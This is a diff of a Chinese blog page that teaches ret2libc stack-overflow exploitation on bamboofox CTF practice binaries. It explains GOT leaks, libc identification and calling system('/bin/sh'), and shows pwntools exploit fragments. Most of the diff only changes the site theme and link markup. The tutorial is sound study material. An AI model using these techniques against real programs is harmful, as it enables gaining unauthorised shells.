+<h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI184">¶</span></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJsaWJj">¶</span></h2><h3 id="原理-¶-3"><a href="#原理-¶-3" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI185">¶</span></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<h3 id="例子-¶-3"><a href="#例子-¶-3" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMA==">¶</span></h3><p>我们由简单到难分别给出三个例子。</p>
+<h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzE=">¶</span></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMxL3JldDJsaWJjMQ==">ret2libc1</span></p>
 <p>首先，我们可以检查一下程序的安全保护</p>
 <pre class="line-numbers language-none"><code class="language-none">➜  ret2libc1 checksec ret2libc1    
     Arch:     i386-32-little
@@ -508,8 +498,8 @@ sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 
 <p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
 <p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
-<h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">¶</a></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
+<h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzI=">¶</span></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMyL3JldDJsaWJjMg==">ret2libc2</span></p>
 <p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>
 <pre class="line-numbers language-none"><code class="language-none">##!/usr/bin/env python
 from pwn import *
@@ -527,8 +517,8 @@ sh.sendline('/bin/sh')
 sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>
-<h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">¶</a></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
+<h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzM=">¶</span></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMzL3JldDJsaWJjMw==">ret2libc3</span></p>
 <p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
 <pre class="line-numbers language-none"><code class="language-none">➜  ret2libc3 checksec ret2libc3
     Arch:     i386-32-little
@@ -554,13 +544,13 @@ sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <ul>
 <li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
 <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
-<li><a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pa2xhc2IvbGliYy1kYXRhYmFzZQ==">https://github.com/niklasb/libc-database</span></li>
 </ul>
 <p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
 <p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
 <p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpZWFudS9MaWJjU2VhcmNoZXI=">https://github.com/lieanu/LibcSearcher</span></li>
 </ul>
 <p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
 <p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
@@ -600,11 +590,354 @@ sh.sendline(payload)
 
 sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11">¶</a></h3><ul>
+<h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMQ==">¶</span></h3><ul>
 <li>train.cs.nctu.edu.tw: ret2libc</li>
 </ul>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://alazymechnaic.github.io">alazymechnaic</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/">https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://alazymechnaic.github.io" target="_blank">alazymechnaic</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/04/27/one-byte-overflow/" title="one_byte_overflow"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">one_byte_overflow</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/36987782?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">alazymechnaic</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/alazymechnaic"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text%C2%B6"><span class="toc-number">1.</span> <span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6"><span class="toc-number">1.1.</span> <span class="toc-text">原理 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6"><span class="toc-number">1.2.</span> <span class="toc-text">例子 </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode%C2%B6"><span class="toc-number">2.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-1"><span class="toc-number">2.1.</span> <span class="toc-text">原理 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-1"><span class="toc-number">2.2.</span> <span class="toc-text">例子 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6"><span class="toc-number">2.3.</span> <span class="toc-text">题目 </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall%C2%B6"><span class="toc-number">3.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-2"><span class="toc-number">3.1.</span> <span class="toc-text">原理 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-2"><span class="toc-number">3.2.</span> <span class="toc-text">例子 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6-1"><span class="toc-number">3.3.</span> <span class="toc-text">题目 </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc%C2%B6"><span class="toc-number">4.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-3"><span class="toc-number">4.1.</span> <span class="toc-text">原理 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-3"><span class="toc-number">4.2.</span> <span class="toc-text">例子 </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-1%C2%B6"><span class="toc-number">4.2.1.</span> <span class="toc-text">例 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-2%C2%B6"><span class="toc-number">4.2.2.</span> <span class="toc-text">例 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-3%C2%B6"><span class="toc-number">4.2.3.</span> <span class="toc-text">例 3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6-2"><span class="toc-number">4.3.</span> <span class="toc-text">题目 </span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/05/libdft64/" title="无题"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2023/09/05/libdft64/" title="无题">无题</a><time datetime="2023-09-05T09:14:20.637Z" title="发表于 2023-09-05 17:14:20">2023-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/05/useful-command/" title="Useful_command"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Useful_command"/></a><div class="content"><a class="title" href="/2023/09/05/useful-command/" title="Useful_command">Useful_command</a><time datetime="2023-09-05T07:15:02.000Z" title="发表于 2023-09-05 15:15:02">2023-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/03/libdft/" title="libdft"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="libdft"/></a><div class="content"><a class="title" href="/2023/09/03/libdft/" title="libdft">libdft</a><time datetime="2023-09-03T08:24:26.000Z" title="发表于 2023-09-03 16:24:26">2023-09-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/30/afl-fuzz-diy/" title="afl_fuzz_DIY"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="afl_fuzz_DIY"/></a><div class="content"><a class="title" href="/2023/08/30/afl-fuzz-diy/" title="afl_fuzz_DIY">afl_fuzz_DIY</a><time datetime="2023-08-30T08:38:13.000Z" title="发表于 2023-08-30 16:38:13">2023-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/sec-paper-list/" title="Sec_paper_list"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sec_paper_list"/></a><div class="content"><a class="title" href="/2023/08/22/sec-paper-list/" title="Sec_paper_list">Sec_paper_list</a><time datetime="2023-08-22T02:00:57.000Z" title="发表于 2023-08-22 10:00:57">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By alazymechnaic</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-POWERMODE.mobile = false;
-document.body.addEventListener('input', POWERMODE);
-</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+      <div class="tags">
+          <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-08-24 09:15:03" itemprop="dateModified" datetime="2023-08-24T09:15:03+08:00">2023-08-24</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="alazymachine 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="alazymachine 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="alazymachine 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>alazymachine <i class="ic i-at"><em>@</em></i>alazymachine
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/" title="Stack_based_overflow">https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/04/27/one-byte-overflow/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4lm9i7j20zk0m84qp.jpg" title="one_byte_overflow">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>one_byte_overflow</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text%C2%B6"><span class="toc-number">1.</span> <span class="toc-text">ret2text¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6"><span class="toc-number">1.1.</span> <span class="toc-text">原理 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6"><span class="toc-number">1.2.</span> <span class="toc-text">例子 ¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode%C2%B6"><span class="toc-number">2.</span> <span class="toc-text">ret2shellcode¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-1"><span class="toc-number">2.1.</span> <span class="toc-text">原理 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-1"><span class="toc-number">2.2.</span> <span class="toc-text">例子 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6"><span class="toc-number">2.3.</span> <span class="toc-text">题目 ¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall%C2%B6"><span class="toc-number">3.</span> <span class="toc-text">ret2syscall¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-2"><span class="toc-number">3.1.</span> <span class="toc-text">原理 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-2"><span class="toc-number">3.2.</span> <span class="toc-text">例子 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6-1"><span class="toc-number">3.3.</span> <span class="toc-text">题目 ¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc%C2%B6"><span class="toc-number">4.</span> <span class="toc-text">ret2libc¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-%C2%B6-3"><span class="toc-number">4.1.</span> <span class="toc-text">原理 ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-%C2%B6-3"><span class="toc-number">4.2.</span> <span class="toc-text">例子 ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-1%C2%B6"><span class="toc-number">4.2.1.</span> <span class="toc-text">例 1¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-2%C2%B6"><span class="toc-number">4.2.2.</span> <span class="toc-text">例 2¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B-3%C2%B6"><span class="toc-number">4.2.3.</span> <span class="toc-text">例 3¶</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-%C2%B6-2"><span class="toc-number">4.3.</span> <span class="toc-text">题目 ¶</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="alazymachine"
+      data-src="/images/myavatar.jpg">
+  <p class="name" itemprop="name">alazymachine</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">21</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">12</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/12/blind-rop/" title="blind-rop">blind-rop</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/07/20/android-basic/" title="Android_Basic">Android_Basic</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/12/heap-exp-heap-management/" title="HEAP-EXP-heap_management">HEAP-EXP-heap_management</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/09/03/libdft/" title="libdft">libdft</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/09/05/useful-command/" title="Useful_command">Useful_command</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/27/viper-ssgvdoa/" title="VIPER_SSGVDOA">VIPER_SSGVDOA</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/07/14/clash-build/" title="clash_build">clash_build</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/30/afl-fuzz-diy/" title="afl_fuzz_DIY">afl_fuzz_DIY</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/02/personal-plan/" title="personal_plan">personal_plan</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/22/sec-paper-list/" title="Sec_paper_list">Sec_paper_list</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">alazymachine @ Alazymachine</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/04/26/stack-based-overflow/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
